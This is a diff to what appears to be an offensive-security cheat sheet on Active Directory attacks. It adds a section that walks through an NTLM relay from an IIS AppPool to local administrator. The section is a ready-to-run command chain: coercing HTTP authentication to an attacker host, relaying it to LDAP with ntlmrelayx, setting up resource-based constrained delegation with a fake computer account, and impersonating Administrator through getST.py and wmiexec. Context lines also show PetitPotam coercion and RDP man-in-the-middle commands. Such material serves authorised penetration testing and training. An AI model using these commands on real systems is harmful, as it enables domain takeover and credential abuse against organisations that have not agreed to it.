@@ -328,8 +328,8 @@ python3 /opt/PetitPotam.py -u jdoe -p 'P@ssw0rd' -d lab.lan attacker@80/test 192
 
 ## Man-in-the-middle RDP connections with pyrdp-mitm
 
-* <https://github.com/GoSecure/pyrdp>
-* <https://www.gosecure.net/blog/2018/12/19/rdp-man-in-the-middle-smile-youre-on-camera/>
+* [GoSecure/pyrdp](https://github.com/GoSecure/pyrdp)
+* [RDP Man-in-the-Middle – Smile! You’re on Camera](https://www.gosecure.net/blog/2018/12/19/rdp-man-in-the-middle-smile-youre-on-camera)
 
 **Usage**
 
@@ -348,6 +348,42 @@ pyrdp-mitm.py <IP> -k private_key.pem -c certificate.pem # with custom key and c
 **Alternatives**
 
 * [SySS-Research/Seth](https://github.com/SySS-Research/Seth), performs ARP spoofing prior to launching the RDP listener
+
+## Relay IIS AppPool to Local Administrator
+
+* HTTP coerce from the targeted machine
+
+    ```ps1
+    powershell iwr http://10.10.10.2 -UseDefaultCredentials 
+    ```
+
+* Relay to LDAP
+
+    ```ps1
+    ntlmrelayx -t ldap://10.10.10.1 -smb2support --interactive
+    ```
+
+* Connect to the interactive LDAP shell via TCP
+
+    ```ps1
+    nc 127.0.0.1 <PORT>
+    ```
+
+* Enable TLS and setup RBCD
+
+    ```ps1
+    start_tls
+    add_computer fakePC P@ssword123
+    set_rbcd TARGET$ fakePC$
+    ```
+
+* Impersonate the administrator
+
+    ```ps1
+    getST.py -spn 'cifs/target.lab.local' -impersonate Administrator -dc-ip 'dc.lab.local' 'lab.local/fakePC$:P@ssword123'
+    export KRB5CCNAME=/tmp/Administrator@cifs_target.lab.local@LAB.LOCAL.ccache
+    wmiexec.py -k -no-pass @target.lab.local
+    ```
 
 ## Common Issues Forwarding Port 445
 
